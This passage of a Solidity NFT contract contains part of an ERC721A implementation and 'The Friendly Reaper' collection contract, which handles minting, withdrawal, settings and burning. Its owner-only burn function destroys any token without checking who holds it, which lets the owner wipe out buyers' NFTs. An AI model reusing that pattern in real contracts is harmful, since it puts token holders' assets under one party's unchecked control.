1002         if (owner == address(0)) revert AuxQueryForZeroAddress();
1003         _addressData[owner].aux = aux;
1004     }
1005 
1006     /**
1007      * Gas spent here starts off proportional to the maximum mint batch size.
1008      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1009      */
1010     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1011         uint256 curr = tokenId;
1012 
1013         unchecked {
1014             if (_startTokenId() <= curr && curr < _currentIndex) {
1015                 TokenOwnership memory ownership = _ownerships[curr];
1016                 if (!ownership.burned) {
1017                     if (ownership.addr != address(0)) {
1018                         return ownership;
1019                     }
1020                     // Invariant:
1021                     // There will always be an ownership that has an address and is not burned
1022                     // before an ownership that does not have an address and is not burned.
1023                     // Hence, curr will not underflow.
1024                     while (true) {
1025                         curr--;
1026                         ownership = _ownerships[curr];
1027                         if (ownership.addr != address(0)) {
1028                             return ownership;
1029                         }
1030                     }
1031                 }
1032             }
1033         }
1034         revert OwnerQueryForNonexistentToken();
1035     }
1036 
1037     /**
1038      * @dev See {IERC721-ownerOf}.
1039      */
1040     function ownerOf(uint256 tokenId) public view override returns (address) {
1041         return ownershipOf(tokenId).addr;
1042     }
1043 
1044     /**
1045      * @dev See {IERC721Metadata-name}.
1046      */
1047     function name() public view virtual override returns (string memory) {
1048         return _name;
1049     }
1050 
1051     /**
1052      * @dev See {IERC721Metadata-symbol}.
1053      */
1054     function symbol() public view virtual override returns (string memory) {
1055         return _symbol;
1056     }
1057 
1058     /**
1059      * @dev See {IERC721Metadata-tokenURI}.
1060      */
1061     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1062         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
1063 
1064         string memory baseURI = _baseURI();
1065         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
1066     }
1067 
1068     /**
1069      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1070      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1071      * by default, can be overriden in child contracts.
1072      */
1073     function _baseURI() internal view virtual returns (string memory) {
1074         return '';
1075     }
1076 
1077     /**
1078      * @dev See {IERC721-approve}.
1079      */
1080     function approve(address to, uint256 tokenId) public override {
1081         address owner = ERC721A.ownerOf(tokenId);
1082         if (to == owner) revert ApprovalToCurrentOwner();
1083 
1084         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
1085             revert ApprovalCallerNotOwnerNorApproved();
1086         }
1087 
1088         _approve(to, tokenId, owner);
1089     }
1090 
1091     /**
1092      * @dev See {IERC721-getApproved}.
1093      */
1094     function getApproved(uint256 tokenId) public view override returns (address) {
1095         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1096 
1097         return _tokenApprovals[tokenId];
1098     }
1099 
1100     /**
1101      * @dev See {IERC721-setApprovalForAll}.
1102      */
1103     function setApprovalForAll(address operator, bool approved) public override {
1104         if (operator == _msgSender()) revert ApproveToCaller();
1105 
1106         _operatorApprovals[_msgSender()][operator] = approved;
1107         emit ApprovalForAll(_msgSender(), operator, approved);
1108     }
1109 
1110     /**
1111      * @dev See {IERC721-isApprovedForAll}.
1112      */
1113     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1114         return _operatorApprovals[owner][operator];
1115     }
1116 
1117     /**
1118      * @dev See {IERC721-transferFrom}.
1119      */
1120     function transferFrom(
1121         address from,
1122         address to,
1123         uint256 tokenId
1124     ) public override onlyAllowedOperator(from) {
1125         _transfer(from, to, tokenId);
1126     }
1127 
1128     /**
1129      * @dev See {IERC721-safeTransferFrom}.
1130      */
1131     function safeTransferFrom(
1132         address from,
1133         address to,
1134         uint256 tokenId
1135     ) public override onlyAllowedOperator(from) {
1136         safeTransferFrom(from, to, tokenId, '');
1137     }
1138 
1139     /**
1140      * @dev See {IERC721-safeTransferFrom}.
1141      */
1142     function safeTransferFrom(
1143         address from,
1144         address to,
1145         uint256 tokenId,
1146         bytes memory _data
1147     ) public override onlyAllowedOperator(from) {
1148         _transfer(from, to, tokenId);
1149         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1150             revert TransferToNonERC721ReceiverImplementer();
1151         }
1152     }
1153 
1154     /**
1155      * @dev Returns whether `tokenId` exists.
1156      *
1157      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1158      *
1159      * Tokens start existing when they are minted (`_mint`),
1160      */
1161     function _exists(uint256 tokenId) internal view returns (bool) {
1162         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1163             !_ownerships[tokenId].burned;
1164     }
1165 
1166     function _safeMint(address to, uint256 quantity) internal {
1167         _safeMint(to, quantity, '');
1168     }
1169 
1170     /**
1171      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1172      *
1173      * Requirements:
1174      *
1175      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1176      * - `quantity` must be greater than 0.
1177      *
1178      * Emits a {Transfer} event.
1179      */
1180     function _safeMint(
1181         address to,
1182         uint256 quantity,
1183         bytes memory _data
1184     ) internal {
1185         _mint(to, quantity, _data, true);
1186     }
1187 
1188     /**
1189      * @dev Mints `quantity` tokens and transfers them to `to`.
1190      *
1191      * Requirements:
1192      *
1193      * - `to` cannot be the zero address.
1194      * - `quantity` must be greater than 0.
1195      *
1196      * Emits a {Transfer} event.
1197      */
1198     function _mint(
1199         address to,
1200         uint256 quantity,
1201         bytes memory _data,
1202         bool safe
1203     ) internal {
1204         uint256 startTokenId = _currentIndex;
1205         if (to == address(0)) revert MintToZeroAddress();
1206         if (quantity == 0) revert MintZeroQuantity();
1207 
1208         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1209 
1210         // Overflows are incredibly unrealistic.
1211         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1212         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1213         unchecked {
1214             _addressData[to].balance += uint64(quantity);
1215             _addressData[to].numberMinted += uint64(quantity);
1216 
1217             _ownerships[startTokenId].addr = to;
1218             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1219 
1220             uint256 updatedIndex = startTokenId;
1221             uint256 end = updatedIndex + quantity;
1222 
1223             if (safe && to.isContract()) {
1224                 do {
1225                     emit Transfer(address(0), to, updatedIndex);
1226                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1227                         revert TransferToNonERC721ReceiverImplementer();
1228                     }
1229                 } while (updatedIndex != end);
1230                 // Reentrancy protection
1231                 if (_currentIndex != startTokenId) revert();
1232             } else {
1233                 do {
1234                     emit Transfer(address(0), to, updatedIndex++);
1235                 } while (updatedIndex != end);
1236             }
1237             _currentIndex = updatedIndex;
1238         }
1239         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1240     }
1241 
1242     /**
1243      * @dev Transfers `tokenId` from `from` to `to`.
1244      *
1245      * Requirements:
1246      *
1247      * - `to` cannot be the zero address.
1248      * - `tokenId` token must be owned by `from`.
1249      *
1250      * Emits a {Transfer} event.
1251      */
1252     function _transfer(
1253         address from,
1254         address to,
1255         uint256 tokenId
1256     ) private {
1257         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1258 
1259         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1260             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1261             getApproved(tokenId) == _msgSender());
1262 
1263         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1264         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1265         if (to == address(0)) revert TransferToZeroAddress();
1266 
1267         _beforeTokenTransfers(from, to, tokenId, 1);
1268 
1269         // Clear approvals from the previous owner
1270         _approve(address(0), tokenId, prevOwnership.addr);
1271 
1272         // Underflow of the sender's balance is impossible because we check for
1273         // ownership above and the recipient's balance can't realistically overflow.
1274         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1275         unchecked {
1276             _addressData[from].balance -= 1;
1277             _addressData[to].balance += 1;
1278 
1279             _ownerships[tokenId].addr = to;
1280             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1281 
1282             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1283             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1284             uint256 nextTokenId = tokenId + 1;
1285             if (_ownerships[nextTokenId].addr == address(0)) {
1286                 // This will suffice for checking _exists(nextTokenId),
1287                 // as a burned slot cannot contain the zero address.
1288                 if (nextTokenId < _currentIndex) {
1289                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1290                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1291                 }
1292             }
1293         }
1294 
1295         emit Transfer(from, to, tokenId);
1296         _afterTokenTransfers(from, to, tokenId, 1);
1297     }
1298 
1299     /**
1300      * @dev Destroys `tokenId`.
1301      * The approval is cleared when the token is burned.
1302      *
1303      * Requirements:
1304      *
1305      * - `tokenId` must exist.
1306      *
1307      * Emits a {Transfer} event.
1308      */
1309     function _burn(uint256 tokenId) internal virtual {
1310         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1311 
1312         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1313 
1314         // Clear approvals from the previous owner
1315         _approve(address(0), tokenId, prevOwnership.addr);
1316 
1317         // Underflow of the sender's balance is impossible because we check for
1318         // ownership above and the recipient's balance can't realistically overflow.
1319         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1320         unchecked {
1321             _addressData[prevOwnership.addr].balance -= 1;
1322             _addressData[prevOwnership.addr].numberBurned += 1;
1323 
1324             // Keep track of who burned the token, and the timestamp of burning.
1325             _ownerships[tokenId].addr = prevOwnership.addr;
1326             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1327             _ownerships[tokenId].burned = true;
1328 
1329             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1330             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1331             uint256 nextTokenId = tokenId + 1;
1332             if (_ownerships[nextTokenId].addr == address(0)) {
1333                 // This will suffice for checking _exists(nextTokenId),
1334                 // as a burned slot cannot contain the zero address.
1335                 if (nextTokenId < _currentIndex) {
1336                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1337                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1338                 }
1339             }
1340         }
1341 
1342         emit Transfer(prevOwnership.addr, address(0), tokenId);
1343         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1344 
1345         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1346         unchecked {
1347             _burnCounter++;
1348         }
1349     }
1350 
1351     /**
1352      * @dev Approve `to` to operate on `tokenId`
1353      *
1354      * Emits a {Approval} event.
1355      */
1356     function _approve(
1357         address to,
1358         uint256 tokenId,
1359         address owner
1360     ) private {
1361         _tokenApprovals[tokenId] = to;
1362         emit Approval(owner, to, tokenId);
1363     }
1364 
1365     /**
1366      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1367      *
1368      * @param from address representing the previous owner of the given token ID
1369      * @param to target address that will receive the tokens
1370      * @param tokenId uint256 ID of the token to be transferred
1371      * @param _data bytes optional data to send along with the call
1372      * @return bool whether the call correctly returned the expected magic value
1373      */
1374     function _checkContractOnERC721Received(
1375         address from,
1376         address to,
1377         uint256 tokenId,
1378         bytes memory _data
1379     ) private returns (bool) {
1380         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1381             return retval == IERC721Receiver(to).onERC721Received.selector;
1382         } catch (bytes memory reason) {
1383             if (reason.length == 0) {
1384                 revert TransferToNonERC721ReceiverImplementer();
1385             } else {
1386                 assembly {
1387                     revert(add(32, reason), mload(reason))
1388                 }
1389             }
1390         }
1391     }
1392 
1393     /**
1394      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1395      * And also called before burning one token.
1396      *
1397      * startTokenId - the first token id to be transferred
1398      * quantity - the amount to be transferred
1399      *
1400      * Calling conditions:
1401      *
1402      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1403      * transferred to `to`.
1404      * - When `from` is zero, `tokenId` will be minted for `to`.
1405      * - When `to` is zero, `tokenId` will be burned by `from`.
1406      * - `from` and `to` are never both zero.
1407      */
1408     function _beforeTokenTransfers(
1409         address from,
1410         address to,
1411         uint256 startTokenId,
1412         uint256 quantity
1413     ) internal virtual {}
1414 
1415     /**
1416      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1417      * minting.
1418      * And also called after one token has been burned.
1419      *
1420      * startTokenId - the first token id to be transferred
1421      * quantity - the amount to be transferred
1422      *
1423      * Calling conditions:
1424      *
1425      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1426      * transferred to `to`.
1427      * - When `from` is zero, `tokenId` has been minted for `to`.
1428      * - When `to` is zero, `tokenId` has been burned by `from`.
1429      * - `from` and `to` are never both zero.
1430      */
1431     function _afterTokenTransfers(
1432         address from,
1433         address to,
1434         uint256 startTokenId,
1435         uint256 quantity
1436     ) internal virtual {}
1437 }
1438 
1439 
1440 
1441 contract TheFriendlyReaper is ERC721A, Owneable {
1442 
1443     string public baseURI = "ipfs://QmVYppDpk1SRd9MEWdAzokcafE58tN5Q2gTuHuuL86N1AK/";
1444     string public contractURI = "ipfs://";
1445     string public baseExtension = ".json";
1446     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1447 
1448     uint256 public MAX_PER_TX_FREE = 3;
1449     uint256 public free_max_supply = 222;
1450     uint256 public constant MAX_PER_TX = 10;
1451     uint256 public max_supply = 2222;
1452     uint256 public price = 0.009 ether;
1453 //Death Awaits us All
1454 
1455 
1456     bool public paused = true;
1457 
1458     constructor() ERC721A("The Friendly Reaper", "reap") {}
1459 
1460     function PublicMint(uint256 _amount) external payable {
1461 
1462         address _caller = _msgSender();
1463         require(!paused, "Paused");
1464         require(max_supply >= totalSupply() + _amount, "All Gone");
1465         require(_amount > 0, "No 0 mints");
1466         require(tx.origin == _caller, "No Contract minting.");
1467         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1468         
1469       if(free_max_supply >= totalSupply()){
1470             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1471         }else{
1472             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1473             require(_amount * price == msg.value, "Invalid funds provided");
1474         }
1475 
1476 
1477         _safeMint(_caller, _amount);
1478     }
1479 
1480 
1481 
1482     function isApprovedForAll(address owner, address operator)
1483         override
1484         public
1485         view
1486         returns (bool)
1487     {
1488         // Whitelist OpenSea proxy contract for easy trading.
1489         
1490         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1491         if (address(proxyRegistry.proxies(owner)) == operator) {
1492             return true;
1493         }
1494 
1495         return super.isApprovedForAll(owner, operator);
1496     }
1497 
1498     function Withdraw() external onlyOwner {
1499         uint256 balance = address(this).balance;
1500         (bool success, ) = _msgSender().call{value: balance}("");
1501         require(success, "Failed to send");
1502     }
1503 
1504     function Reserve(uint256 quantity) external onlyOwner {
1505         _safeMint(_msgSender(), quantity);
1506     }
1507 
1508 
1509     function pause(bool _state) external onlyOwner {
1510         paused = _state;
1511     }
1512 
1513     function setBaseURI(string memory baseURI_) external onlyOwner {
1514         baseURI = baseURI_;
1515     }
1516 
1517     function setContractURI(string memory _contractURI) external onlyOwner {
1518         contractURI = _contractURI;
1519     }
1520 
1521     function configPrice(uint256 newPrice) public onlyOwner {
1522         price = newPrice;
1523     }
1524 
1525 
1526      function configMAX_PER_TX_FREE(uint256 newFREE) public onlyOwner {
1527         MAX_PER_TX_FREE = newFREE;
1528     }
1529 
1530     function configmax_supply(uint256 newSupply) public onlyOwner {
1531         max_supply = newSupply;
1532     }
1533 
1534     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1535         free_max_supply = newFreesupply;
1536     }
1537     function newbaseExtension(string memory newex) public onlyOwner {
1538         baseExtension = newex;
1539     }
1540 
1541 
1542 
1543         function burn(uint256[] memory tokenids) external onlyOwner {
1544         uint256 len = tokenids.length;
1545         for (uint256 i; i < len; i++) {
1546             uint256 tokenid = tokenids[i];
1547             _burn(tokenid);
1548         }
1549     }
1550 
1551 
1552     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1553         require(_exists(_tokenId), "Token does not exist.");
1554         return bytes(baseURI).length > 0 ? string(
1555             abi.encodePacked(
1556               baseURI,
1557               Strings.toString(_tokenId),
1558               baseExtension
1559             )
1560         ) : "";
1561     }
1562 }
1563 
1564 contract OwnableDelegateProxy { }
1565 contract ProxyRegistry {
1566     mapping(address => OwnableDelegateProxy) public proxies;
1567 }